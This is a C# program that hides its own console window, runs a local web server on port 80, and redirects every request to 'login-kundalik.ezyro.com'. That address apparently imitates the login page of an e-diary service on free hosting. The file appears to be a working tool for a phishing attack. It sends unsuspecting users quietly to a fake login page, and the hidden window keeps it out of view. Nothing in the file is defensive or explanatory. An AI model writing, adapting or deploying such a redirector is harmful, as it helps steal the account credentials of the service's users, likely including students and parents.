using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ServerRedirecting
{
    internal class Program
    {
        private static HttpListener listener;

        readonly static string page =
            "<!DOCTYPE><html><head>" +
            "<meta http-equiv=\"refresh\" content=\"0; url={0}\">" +
            "</head><body></body></html>";

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public static void Start(int port)
        {
            listener = new HttpListener();
            listener.Prefixes.Add($"http://127.0.0.1:{port}/");
            listener.Start();
        }

        public static async Task Handler(string url)
        {
            while (true)
            {
                HttpListenerContext context = await listener.GetContextAsync();
                HttpListenerResponse response = context.Response;

                byte[] buffer = Encoding.UTF8.GetBytes(string.Format(page, url));
                response.ContentType = "text/html";
                response.ContentEncoding = Encoding.UTF8;
                response.ContentLength64 = buffer.LongLength;

                await response.OutputStream.WriteAsync(buffer, 0, buffer.Length);
                response.Close();
            }
        }

        static void Main()
        {
            ShowWindow(GetConsoleWindow(), 0);
            
            Start(80);
            Handler("https://login-kundalik.ezyro.com/").GetAwaiter().GetResult();
        }
    }
}
